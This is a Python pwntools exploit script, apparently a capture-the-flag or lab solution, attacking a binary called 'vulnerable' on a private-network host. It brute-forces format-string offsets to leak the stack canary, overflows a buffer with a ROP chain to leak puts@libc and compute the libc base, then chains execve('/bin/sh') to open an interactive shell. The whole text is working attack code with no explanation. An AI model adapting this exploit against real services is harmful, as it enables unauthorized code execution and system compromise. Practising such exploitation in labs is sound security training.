from pwn import *

HOST = '192.168.56.102'
PORT = 1447

binary = context.binary = ELF('./vulnerable', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

for i in range(1, 50):
	try:
		p = remote(HOST, PORT, timeout=2)
		fmt = f"%{i}$p".encode()
		p.sendlineafter(b"Enter the access key to unlock the terminal: ", fmt)
		p.recvuntil(b"Welcome, Operative: \n")
		leak = p.recvline().strip()
		p.close()
		
		if b'0x' in leak and leak.endswith(b'00'):
			log.info(f"Trying %{i}$p")
			log.success(f"Leaked canary at %{i}$p: {leak}")
			canary = int(leak, 16)
	except Exception as e:
		log.warning(f"Failed at %{i}$p: {e}")

# p = process()
p = remote(HOST, PORT)

# Step 1: Leak canary using format string
p.sendlineafter(b"Enter the access key to unlock the terminal: ", b"%23$p")
p.recvuntil(b"Welcome, Operative: \n")
canary_leak = p.recvline().strip().split(b"\n")[0]
canary = int(canary_leak, 16)
log.success(f"Leaked canary: {hex(canary)}")

# Step 2: Leak puts@libc using ROP in second gets()
padding = b"A"*72
junk = b"B"*8

rop = ROP(binary)
rop.puts(binary.got['puts'])
rop.call(binary.symbols['main'])

payload = padding + p64(canary) + junk + rop.chain()
log.info("Leak libc: %s" % payload)

# Stage 3: Read leaked write
p.sendlineafter(b"Enter the encryption key to decrypt the payload: ", payload)
print(p.recvline())
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"Leaked puts@libc: {hex(leaked_puts)}")
p.sendlineafter(b"Enter the access key to unlock the terminal: ", junk)

if libc != "":
	libc.address = leaked_puts - libc.symbols["puts"]
	log.info("Libc base address @ %s" % hex(libc.address))

rop = ROP([binary, libc])
binsh = next(libc.search(b"/bin/sh"))
rop.execve(binsh, 0, 0)

payload = padding + p64(canary) + junk + rop.chain()
log.info("Leak libc: %s" % payload)
log.info("system chain dump:\n%s" % rop.dump())

p.sendlineafter(b"Enter the encryption key to decrypt the payload: ", payload)
p.interactive()